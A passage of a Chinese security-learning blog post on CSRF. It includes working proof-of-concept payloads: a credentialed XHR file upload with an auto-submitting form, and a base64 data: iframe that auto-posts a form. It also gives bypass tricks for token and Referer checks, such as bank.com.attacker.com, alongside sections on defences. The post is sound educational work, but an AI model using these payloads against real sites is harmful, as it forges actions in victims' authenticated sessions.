+        xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"http:\/\/www.123.com\/upload.php"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"multipart\/form-data; boundary=----WebKitFormBoundary3j90njzdr6yJb9QC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Accept"</span><span class="token punctuation">,</span> <span class="token string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Accept-Language"</span><span class="token punctuation">,</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> body <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundary3j90njzdr6yJb9QC\r\n"</span> <span class="token operator">+</span>
+            <span class="token string">"Content-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\r\n"</span> <span class="token operator">+</span>
+            <span class="token string">"Content-Type: text/plain\r\n"</span> <span class="token operator">+</span>
+            <span class="token string">"\r\n"</span> <span class="token operator">+</span>
+            <span class="token string">"test upload\n"</span> <span class="token operator">+</span>
+            <span class="token string">"\r\n"</span> <span class="token operator">+</span>
+            <span class="token string">"------WebKitFormBoundary3j90njzdr6yJb9QC--\r\n"</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> aBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> aBody<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+            aBody<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>aBody<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submitRequest();<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    <span class="token keyword">var</span> m <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    m<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<p>执行发现确实上传上去了，不过自动提交出了点问题，可能是我本地的原因，搞了半天……</p>
+<h2 id="CSRF蠕虫"><a href="#CSRF蠕虫" class="headerlink" title="CSRF蠕虫"></a>CSRF蠕虫</h2><p>CSRF也可以形成蠕虫，如果在一个可以创建帖子的地方有csrf，就可以在提交帖子的中放出payload，就可以一直传播下去，也可以与xss配合形成蠕虫</p>
+<p>实例：<br><a href="https://www.codercto.com/a/40828.html" target="_blank" rel="noopener">基于社交媒体的csrf蠕虫风暴探索</a><br><a href="https://www.uedbox.com/post/36858/" target="_blank" rel="noopener">新浪另类CSRF蠕虫放大危害</a><br><a href="https://bbs.ichunqiu.com/thread-21477-1-1.html" target="_blank" rel="noopener">经典的XSS+CSRF结合造成的蠕虫病毒式推广</a><br><a href="https://www.leavesongs.com/HTML/sina-jsonp-hijacking-csrf-worm.html" target="_blank" rel="noopener">分享一个jsonp劫持造成的新浪某社区CSRF蠕虫</a></p>
+<h1 id="0x03-漏洞防御"><a href="#0x03-漏洞防御" class="headerlink" title="0x03 漏洞防御"></a>0x03 漏洞防御</h1><p>既然CSRF出在身份检验，防御当然也要从这里入手，思路就是要利用攻击者伪造不了的东西进行认证。</p>
+<h2 id="token-验证"><a href="#token-验证" class="headerlink" title="token 验证"></a>token 验证</h2><p>使用token来代替验证码验证。由于黑客并不能拿到和看到cookie里的内容，所以无法伪造一个完整的请求。基本思路如下：</p>
+<ol>
+<li>服务器随机产生token（比如把cookie hash化生成），存在session中，放在cookie中或者以ajax的形式交给前端。</li>
+<li>前端发请求的时候，解析cookie中的token，放到请求url里或者请求头中。</li>
+<li>服务器验证token，由于黑客无法得到或者伪造token，所以能防范csrf</li>
+</ol>
+<p>基于这个思路，还可以延申，使token加密等等……是的即使攻击者获取到了token仍然无法使用</p>
+<h2 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h2><p>既然CSRF是跨域请求，我们就可以在对Referer检验，看这个来源是否合法，利用白名单进行过滤，不合法就拒绝响应</p>
+<h2 id="在HTTP头中自定义属性并验证"><a href="#在HTTP头中自定义属性并验证" class="headerlink" title="在HTTP头中自定义属性并验证"></a>在HTTP头中自定义属性并验证</h2><p>通token一样，只不过是把token放到了HTTP自定义的属性当中</p>
+<h1 id="0x04-Bypass"><a href="#0x04-Bypass" class="headerlink" title="0x04 Bypass"></a>0x04 Bypass</h1><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</p>
+<h2 id="更改请求方法"><a href="#更改请求方法" class="headerlink" title="更改请求方法"></a>更改请求方法</h2><p>尝试更改请求方法，由于只对一种请求方法做了见到，可能就会绕过。</p>
+<h2 id="CSRF-token的绕过"><a href="#CSRF-token的绕过" class="headerlink" title="CSRF token的绕过"></a>CSRF token的绕过</h2><h3 id="删除token参数或发送空token"><a href="#删除token参数或发送空token" class="headerlink" title="删除token参数或发送空token"></a>删除token参数或发送空token</h3><p>应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p>
+<h3 id="使用另一个session的CSRF-token"><a href="#使用另一个session的CSRF-token" class="headerlink" title="使用另一个session的CSRF token"></a>使用另一个session的CSRF token</h3><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p>
+<h2 id="Referer检验绕过"><a href="#Referer检验绕过" class="headerlink" title="Referer检验绕过"></a>Referer检验绕过</h2><h3 id="Referer为空"><a href="#Referer为空" class="headerlink" title="Referer为空"></a>Referer为空</h3><p>和token同理，应用程序可能只是在发送后才会验证，这种情况下，只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面，表示referrer为空</p>
+<pre><code>&lt;meta name =“referrer”content =“no-referrer”&gt;</code></pre><p>同时可以利用其他协议来达成Referer为空</p>
+<p>如<code>ftp://,http://,https://,file://,javascript:,data:</code>这些协议。这个时候浏览器地址栏是<code>file://</code>开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。<br>data:协议：</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>利用https协议:</p>
+<pre><code>https向http跳转的时候Referer为空,拿一个https的webshell
+&lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;
+attack.php写上CSRF攻击代码</code></pre><h3 id="绕过正则表达式"><a href="#绕过正则表达式" class="headerlink" title="绕过正则表达式"></a>绕过正则表达式</h3><p>如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。</p>
+<p>如果一个站点在referer字段检查<code>“bank.com”</code>字段，那么<code>“bank.com.attacker.com&quot;</code>或<code>”attakcer.com/bank.com&quot;</code>可能可以绕过这种检测。</p>
+<h3 id="判断Referer是某域情况下绕过"><a href="#判断Referer是某域情况下绕过" class="headerlink" title="判断Referer是某域情况下绕过"></a>判断Referer是某域情况下绕过</h3><p>比如你找的csrf是xxx.com验证的referer是验证的*.xx.com可以找个二级域名之后&lt;img “csrf地址”&gt;之后在把文章地址发出去就可以伪造。</p>
+<h1 id="0x05-思维导图"><a href="#0x05-思维导图" class="headerlink" title="0x05 思维导图"></a>0x05 思维导图</h1><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200405012519.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a><br><a href="https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/</a><br><a href="https://zhuanlan.zhihu.com/p/37293032" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/37293032</a><br><a href="https://xz.aliyun.com/t/6176" target="_blank" rel="noopener">https://xz.aliyun.com/t/6176</a></p>
+<hr>
+<p>版权声明：</p>
+<p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p>
+<hr>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://blog.j0k3r.cn" rel="external nofollow noreferrer">Joker</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://blog.j0k3r.cn/95464039.html">http://blog.j0k3r.cn/95464039.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="http://blog.j0k3r.cn" target="_blank">Joker</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,qzone,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/95464039.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="CSRF漏洞学习">
+                        
+                        <span class="card-title">CSRF漏洞学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            CSRF漏洞学习
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Joker
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/236463394.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="XSS学习笔记">
+                        
+                        <span class="card-title">XSS学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            XSS学习笔记
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-02
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Joker
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('50')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Joker<br />'
+            + '文章作者: Joker<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            
+            &nbsp;苦逼博主已经肝了&nbsp;<span
+                class="white-color">31.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <!-- <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span> -->
+            
+            
+            <span id="busuanzi_container_site_uv">
+                AND 你是第&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;名访客
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "3";
+                    var startDate = "17";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="http://blog.j0k3r.cn" target="_blank">Joker</a>
+            <!-- |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a> -->
+            <!-- |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a> -->
+            <br>
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/j0k3r-z" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:517112960@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=517112960" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 517112960" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
